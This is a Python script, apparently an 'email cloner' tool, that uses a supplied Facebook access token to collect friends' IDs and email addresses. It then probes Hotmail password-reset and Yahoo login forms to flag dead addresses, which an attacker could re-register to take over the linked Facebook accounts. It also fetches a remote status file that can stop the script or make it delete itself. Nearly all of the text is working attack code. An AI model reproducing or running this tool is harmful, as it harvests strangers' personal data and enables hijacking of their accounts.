
from multiprocessing.pool import ThreadPool
import json, os, time, zlib
os.system("clear")
print ("\033[93mEmail Cloner Yahoo\n Made with Love \033[0m")
try:
	import requests, mechanize
except ImportError:
	print ("\nInstalling...")
	time.sleep(1)
	os.system("pip2 install requests;pip2 install mechanize")
	print ("\nInstall: Done!")
status = 'https://hello-rexxxz.c9users.io/Yclone/emailcloner/sts-mailclon.txt'
stcek = requests.get(status).content
if not "openThisTool" in stcek:
	exit()
elif "delete" in stcek:
	os.system("rm hotmailcloner.py")

token = raw_input("\nYour Facebook Token: ")
cekt = requests.get("https://graph.facebook.com/me/friends?fields=id&limit=5000&access_token="+token)
cekt2 = json.loads(cekt.text)
if "error" in cekt2:
	print ("Token Invalid!")
	exit()
else:
	pass
id = []
print ("\nGetting Friends Id.")
for s in cekt2['data']:
	id.append(s['id'])
time.sleep(1)
print ("Success Getting Friends Id.")
time.sleep(1)
print ("Cracking....\n")
#mbul48
def main(arg):
	br = mechanize.Browser()
	br.set_handle_robots(False)
	try:
		a = requests.get('https://graph.facebook.com/'+arg+'/?access_token='+token)
		b = json.loads(a.text)
		if 'hotmail.com' in b['email']:
			url = 'https://account.live.com/ResetPassword.aspx'
			br.open(url)
			br._factory.is_html = True
			br.select_form(nr=0)
			br['iSigninName'] = b['email']
			kmz = br.submit().read()
			if "pMemberNameErr" in kmz:
				print ("\x1b[0;0m[   \x1b[0;92mvuln   \x1b[0;0m]  \x1b[1;95m-  \x1b[0;92m" + b['name'] +  " - " + b['email'])
			else:
				pass
		elif 'yahoo.com' in b['email']:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br['username'] = b['email']
			kmz = br.submit().read()
			if "Maaf" in kmz:
				print ("\x1b[0;0m[   \x1b[0;92mvuln   \x1b[0;0m]  \x1b[1;95m-  \x1b[0;92m" + b['name'] +  " - " + b['email'])
	
	except KeyError:
		pass
	
p = ThreadPool(10)
p.map(main,id)
print ("\nDone!")
